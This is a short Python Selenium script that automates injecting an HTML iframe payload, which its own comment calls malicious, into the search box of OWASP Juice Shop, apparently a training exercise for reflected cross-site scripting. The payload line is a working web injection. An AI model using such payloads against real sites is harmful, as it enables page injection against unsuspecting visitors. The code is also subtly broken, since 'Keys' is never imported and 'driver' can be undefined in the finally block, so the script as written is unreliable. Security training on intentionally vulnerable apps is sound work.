from selenium import webdriver
from selenium.webdriver.chrome.service import Service
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.support.ui import Select
import os

try:
	IP_ADDRESS = os.environ['OWASP_JUICE_SHOP_IP_ADDRESS']
	PORT = os.environ['OWASP_JUICE_SHOP_PORT']
	driver = webdriver.Chrome()
	driver.get(f"http://{IP_ADDRESS}:{PORT}")

	#User inputs malicious iframe into search box
	WebDriverWait(driver, 20).until(EC.element_to_be_clickable((By.XPATH, "//button[contains(., 'Dismiss')]"))).click()
	WebDriverWait(driver, 20).until(EC.element_to_be_clickable((By.ID, "searchQuery"))).click()
	WebDriverWait(driver, 20).until(EC.element_to_be_clickable((By.ID, "mat-input-1"))).send_keys("<iframe width=\"100%\" height=\"166\" scrolling=\"no\" frameborder=\"no\" allow=\"autoplay\" src=\"https://w.soundcloud.com/player/?url=https%3A//api.soundcloud.com/tracks/771984076&color=%23ff5500&auto_play=true&hide_related=false&show_comments=true&show_user=true&show_reposts=false&show_teaser=true\"></iframe>")
	WebDriverWait(driver, 20).until(EC.element_to_be_clickable((By.ID, "mat-input-1"))).send_keys(Keys.ENTER)
	
finally:
  driver.quit()
